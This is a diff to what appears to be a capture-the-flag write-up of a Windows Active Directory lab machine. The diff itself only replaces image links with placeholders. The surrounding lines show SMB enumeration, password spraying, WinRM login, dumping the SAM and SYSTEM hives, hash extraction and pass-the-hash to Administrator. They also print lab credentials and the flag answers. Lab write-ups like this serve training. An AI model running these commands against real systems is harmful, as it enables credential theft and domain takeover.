@@ -20,9 +20,9 @@ export target=10.129.11.232
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="448" height="60" alt="image" src="https://github.com/user-attachments/assets/af30da84-5593-43bd-9f08-5cead6f302c9" />
+<img width="448" height="60" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="492" height="414" alt="image" src="https://github.com/user-attachments/assets/57a00baa-62ce-4ba2-988b-8cc4e83f517b" />
+<img width="492" height="414" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Discovered Open Ports:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 50845
 
@@ -34,7 +34,7 @@ Comprehensive service version detection and script scanning:
 sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,50845 -T4 $target
 ```
 
-<img width="942" height="828" alt="image" src="https://github.com/user-attachments/assets/7e36373b-17ac-4614-b103-878ba3da896c" />
+<img width="942" height="828" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Key Services Identified:**
 - **Port 53:** DNS Service
@@ -51,7 +51,7 @@ Anonymous SMB share enumeration revealed accessible shares:
 smbclient -N -L //10.129.11.232/
 ```
 
-<img width="934" height="725" alt="image" src="https://github.com/user-attachments/assets/aab5f1c4-1a9d-44ab-9d42-dc8b0328ac39" />
+<img width="934" height="725" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 **Available Shares:**
 - ADMIN$ (Remote Admin)
@@ -73,9 +73,9 @@ smbclient //10.129.11.232/HR
 cat "Notice from HR.txt"
 ```
 
-<img width="934" height="725" alt="image" src="https://github.com/user-attachments/assets/d23fdd9e-c0ee-49cb-93f3-5d753b0489fa" />
+<img width="934" height="725" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
-<img width="952" height="541" alt="image" src="https://github.com/user-attachments/assets/d345e30b-15a5-4d06-ac2f-ac06709a54ab" />
+<img width="952" height="541" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 **Credentials Discovered:**  
 Default password pattern: `Cicada$M6Corpb*@Lp#nZp!8`
@@ -88,7 +88,7 @@ RID brute-forcing to discover domain users:
 crackmapexec smb $target -u 'guest' -p '' --rid-brute 2>/dev/null
 ```
 
-<img width="952" height="688" alt="image" src="https://github.com/user-attachments/assets/0438b352-38f6-44d3-acbe-ca8c685ecf67" />
+<img width="952" height="688" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 **Discovered Domain Users:**
 - Administrator
@@ -109,7 +109,7 @@ Password spraying with discovered default credentials:
 crackmapexec smb $target -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success 2>/dev/null
 ```
 
-<img width="953" height="405" alt="image" src="https://github.com/user-attachments/assets/5c792fb1-e572-414b-acd2-c4e5f6f8937f" />
+<img width="953" height="405" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 **Valid Credentials Found:**  
 `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`
@@ -124,9 +124,9 @@ Further enumeration revealed another user's credentials:
 crackmapexec smb $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users 2>/dev/null
 ```
 
-<img width="951" height="343" alt="image" src="https://github.com/user-attachments/assets/c28c417a-3f93-4866-bb41-b2e8996d5645" />
+<img width="951" height="343" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
-<img width="957" height="289" alt="image" src="https://github.com/user-attachments/assets/5f022768-d7a1-4cb3-82a7-69aa21494afa" />
+<img width="957" height="289" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **Additional Credentials:**  
 `david.orelious:aRt$Lp#7t*VQ!3`
@@ -139,7 +139,7 @@ Accessing the DEV share with David's credentials:
 smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.129.11.232/DEV
 ```
 
-<img width="916" height="289" alt="image" src="https://github.com/user-attachments/assets/b0ae86de-7166-4e89-9812-5c8649c76c1c" />
+<img width="916" height="289" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 **Discovered File:** `Backup_script.ps1`
 
@@ -163,9 +163,9 @@ crackmapexec winrm $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' 2>/dev/null
 evil-winrm -i $target -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 ```
 
-<img width="948" height="185" alt="image" src="https://github.com/user-attachments/assets/05f3498c-16ec-48f1-b05e-826b5f8170a9" />
+<img width="948" height="185" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
-<img width="952" height="579" alt="image" src="https://github.com/user-attachments/assets/6faf841a-ceb1-4439-98bd-cbc1d38400cc" />
+<img width="952" height="579" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **User Flag:** `3692d04e5db2d48dadce05ee6a469235`
 
@@ -195,7 +195,7 @@ reg save HKLM\SAM C:\Users\emily.oscars.CICADA\Documents\sam
 reg save HKLM\SYSTEM C:\Users\emily.oscars.CICADA\Documents\SYSTEM
 ```
 
-<img width="950" height="395" alt="image" src="https://github.com/user-attachments/assets/061db47d-07c4-4423-8ed8-18e38f4d9cca" />
+<img width="950" height="395" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 ### Credential Extraction
 
@@ -205,7 +205,7 @@ Using Impacket to extract password hashes:
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
-<img width="711" height="197" alt="image" src="https://github.com/user-attachments/assets/2dee244a-fc1a-4e7c-bff8-e25e5749babb" />
+<img width="711" height="197" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 **Administrator NTLM Hash:** `2b87e7c93a3e8a0ea4a581937016f341`
 
@@ -217,7 +217,7 @@ Pass-the-hash attack using Evil-WinRM:
 evil-winrm -i $target -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
 ```
 
-<img width="952" height="695" alt="image" src="https://github.com/user-attachments/assets/87a88ed4-626d-44cc-b258-7cb7f30828b9" />
+<img width="952" height="695" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 **Root Flag:** `ff17e2ce0fc4b8e1f0fb7947aa0dd60a`
 
